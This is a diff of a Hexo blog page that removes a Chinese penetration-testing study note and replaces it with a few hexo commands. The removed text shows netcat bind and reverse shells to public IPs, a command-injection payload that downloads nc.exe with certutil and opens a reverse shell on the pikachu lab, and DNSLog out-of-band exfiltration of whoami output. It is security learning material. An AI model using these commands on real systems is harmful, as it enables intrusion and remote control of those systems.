@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>xiaodi5 | 十二亿七千光年的blog</title>
+    <title>test | 十二亿七千光年的blog</title>
     <meta name="author" content="十二亿七千光年" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -156,7 +156,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>xiaodi5</h1>
+        <h1>test</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -170,177 +170,7 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="基础入门-反弹-SHELL-不回显带外-正反向连接-防火墙出入站-文件下载"><a href="#基础入门-反弹-SHELL-不回显带外-正反向连接-防火墙出入站-文件下载" class="headerlink" title="基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载"></a>基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</h1><h2 id="1、渗透命令-常规命令-文件上传下载"><a href="#1、渗透命令-常规命令-文件上传下载" class="headerlink" title="1、渗透命令-常规命令&amp;文件上传下载"></a>1、渗透命令-常规命令&amp;文件上传下载</h2><h2 id="（1）常规基本渗透命令详解"><a href="#（1）常规基本渗透命令详解" class="headerlink" title="（1）常规基本渗透命令详解"></a>（1）常规基本渗透命令详解</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
-<h2 id="（2）文件上传下载"><a href="#（2）文件上传下载" class="headerlink" title="（2）文件上传下载"></a>（2）文件上传下载</h2><ul>
-<li><p>文件上传下载-解决无图形化&amp;解决数据传输</p>
-</li>
-<li><p>使用环境：实际使用中，浏览器访问web的文件目录自动进行下载的文件，但系统内没有图形化界面时，使用命令向自己的服务器请求下载文件</p>
-</li>
-<li><p>命令生成：使用棱角社区的生成下载命令的在线工具</p>
-<p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410242013716.png"></p>
-<p>填写自己的服务器ip和端口，对不同的操作系统选择不同的命令</p>
-</li>
-</ul>
-<h2 id="2-反弹-Shell-命令-解决数据回显-解决数据通讯"><a href="#2-反弹-Shell-命令-解决数据回显-解决数据通讯" class="headerlink" title="2.反弹 Shell 命令-解决数据回显&amp;解决数据通讯"></a>2.反弹 Shell 命令-解决数据回显&amp;解决数据通讯</h2><ul>
-<li><p>windows：下载nc工具</p>
-<p>linux：使用自带的nc(ncat)</p>
-</li>
-<li><p>命令生成：棱角社区反弹shell一键生成</p>
-<p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
-</li>
-</ul>
-<h2 id="（1）正向连接：我连接你"><a href="#（1）正向连接：我连接你" class="headerlink" title="（1）正向连接：我连接你"></a>（1）正向连接：我连接你</h2><ul>
-<li><p>本地监听等待对方连接，端口选择1-65535（只要不被占用）</p>
-<ul>
-<li><p>Linux 控制 Windows </p>
-<p>windows绑定 CMD 到本地 5566 端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd -lvp 5566</span><br></pre></td></tr></table></figure>
-
-<p>linux主动连接目标windows（47.122.23.131）5566 ，进入到windows的cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.122.23.131 5566</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410242312762.png"></p>
-</li>
-<li><p>Windows 控制 Linux </p>
-<p>linux绑定 &#x2F;bin&#x2F;sh 到本地 5566 端口 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh -lvp 5566</span><br></pre></td></tr></table></figure>
-
-<p>windows主动连接目标linux（47.94.236.117），进入到linux的&#x2F;bin&#x2F;sh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.94.236.117 5566</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\14232\AppData\Roaming\Typora\typora-user-images\image-20241024232921410.png" alt="image-20241024232921410"></p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="（2）反向连接：我等着你连接"><a href="#（2）反向连接：我等着你连接" class="headerlink" title="（2）反向连接：我等着你连接"></a>（2）反向连接：我等着你连接</h2><ul>
-<li><p>主动给出去，对方监听</p>
-</li>
-<li><p>windows控制linux</p>
-<p>linux绑定&#x2F;bin&#x2F;sh主动给到目标 windows（47.122.23.131）5566 端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 47.122.23.131 5566</span><br></pre></td></tr></table></figure>
-
-<p>windows5566 连接，进入到linux的&#x2F;bin&#x2F;sh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>linux控制windows</p>
-<p>windows绑定CMD主动给到目标linux（47.94.236.117） 5566 端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd 47.94.236.117 5566</span><br></pre></td></tr></table></figure>
-
-<p>linux 5566 连接，进入windows的cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410242357428.png"></p>
-</li>
-</ul>
-<hr>
-<ul>
-<li><p>Linux外网服务器连接内网windows</p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251036293.png"></p>
-<p>linux找不到windows的ip，windows可以访问外网linux，只能windows主动给出去</p>
-<p>内网windows，内网ip（192.168.1.99），出网ip（171.0.1.2）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd 47.94.236.117 5566</span><br></pre></td></tr></table></figure>
-
-<p>外网linux</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 5566</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>内网windows连接外网linux服务器</p>
-<p>外网linux：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh -lvp 5566</span><br></pre></td></tr></table></figure>
-
-<p>内网windows：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.94.236.117 5566</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="3-实际案例1：防火墙绕过-正向连接-反向连接-内网服务器"><a href="#3-实际案例1：防火墙绕过-正向连接-反向连接-内网服务器" class="headerlink" title="3.实际案例1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>3.实际案例1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h2><ul>
-<li><p>管道符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| (管道符号) || (逻辑或) &amp;&amp; (逻辑与) &amp; (后台任务符号)</span><br></pre></td></tr></table></figure>
-
-<p>windows：| &amp; || &amp;&amp;</p>
-<p>linux: ; | || &amp; &amp;&amp; `&#96; (特有 ; 和 `&#96;)</p>
-</li>
-<li><p>使用管道符实现执行多个命令</p>
-<p>例子：</p>
-<ul>
-<li><pre><code>ping -c 1 127.0.0.1 ; whoami
-ping ;whoami
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  ping -c 1 127.0.0.1 | whoami</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><pre><code>ping -c 1 127.0.0.1 || whoami
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  ping -c 1 127.0.0.1 &amp; whoami</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><pre><code>ping -c 1 127.0.0.1 &amp;&amp; whoami
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  ping -c 1 127.0.0.1 `whoami` </span><br><span class="line">  ping `whoami`</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
-</li>
-<li><p>使用nc连接pikachu靶场ping题：</p>
-<p>1.获取nc.exe到路径C:\\</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0 | certutil -urlcache -split -f https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/tool/nc.exe C:\\nc.exe</span><br></pre></td></tr></table></figure>
-
-<p>2.执行nc进行反向连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0 | C:\\nc.exe -e cmd 8.155.11.131 5566</span><br></pre></td></tr></table></figure>
-
-<p>3.公网linux监听自身5566端口获得cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 5566</span><br></pre></td></tr></table></figure>
-
-<p>注：服务器连接不上，需要配置防火墙入站规则</p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251430425.png"></p>
-</li>
-<li><p>防火墙：入站规则，出站规则</p>
-<p>防火墙一般默认入站严格，出站宽松</p>
-</li>
-</ul>
-<h2 id="4-实际案例-2：防火墙组合数据不回显-ICMP-带外查询-Dnslog"><a href="#4-实际案例-2：防火墙组合数据不回显-ICMP-带外查询-Dnslog" class="headerlink" title="4. 实际案例 2：防火墙组合数据不回显-ICMP 带外查询 Dnslog"></a>4. 实际案例 2：防火墙组合数据不回显-ICMP 带外查询 Dnslog</h2><ul>
-<li><p>漏洞有，但数据<strong>不回显</strong>：</p>
-<ul>
-<li><p>方法1：反弹shell</p>
-</li>
-<li><p>方法2：带外查询:看不到结果，主动带出来</p>
-<ul>
-<li><p>平台：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">DNSLog 平台 — DNSLog Platform</a></p>
-</li>
-<li><p>使用：获取一个SubDomain地址，尝试去ping，ping通了网页会有一个记录，表示命令执行成功。防火墙对此无影响</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping zqsx0z.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\14232\AppData\Roaming\Typora\typora-user-images\image-20241025191257501.png" alt="image-20241025191257501"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping whoami.zqsx0z.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<p>问题：只输出了字符串whoami，并没有执行whoami命令</p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251912607.png"> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.zqsx0z.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<p>问题：windows的cmd命令识别不了&#96;&#96;,这个符号是linux系统特有的</p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251916671.png"></p>
-<p>并且，cmd不能带入执行whoami</p>
-<p>办法：采用powershell赋值变量进行执行</p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251926207.png"></p>
-<p>$x&#x3D;whoami;$y&#x3D;’.am84eg.dnslog.cn’</p>
-<p>$z&#x3D;$x+$y</p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251933057.png"></p>
-<p>问题：地址里有一个 \ 导致找不到</p>
-<p>方法：使用replace()替换 \ </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$z=$z.replace(&#x27;\&#x27;,&#x27;xxx&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251939454.png"></p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410251943381.png"></p>
-<p>最终构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | powershell $x=whoami;$x=$x.replace(&#x27;\&#x27;,&#x27;xxx&#x27;);$y=&#x27;.blefo9.dnslog.cn&#x27;;$z=$x+$y;ping $z</span><br></pre></td></tr></table></figure>
-
-<p>cmd无法同时执行ping和whoami，用powershell变量赋值，把whoami执行结果给变量，结果带有“\”导致ping无法执行，需替换</p>
-<p><img src="https://learning-image-hwt.oss-cn-heyuan.aliyuncs.com/image1/202410252107265.png"></p>
-<p>至此，命令执行成功，带出回显</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
+        <p>hexo new “文章题目”<br>hexo clean<br>hexo g<br>hexo d</p>
 
     </div>
     
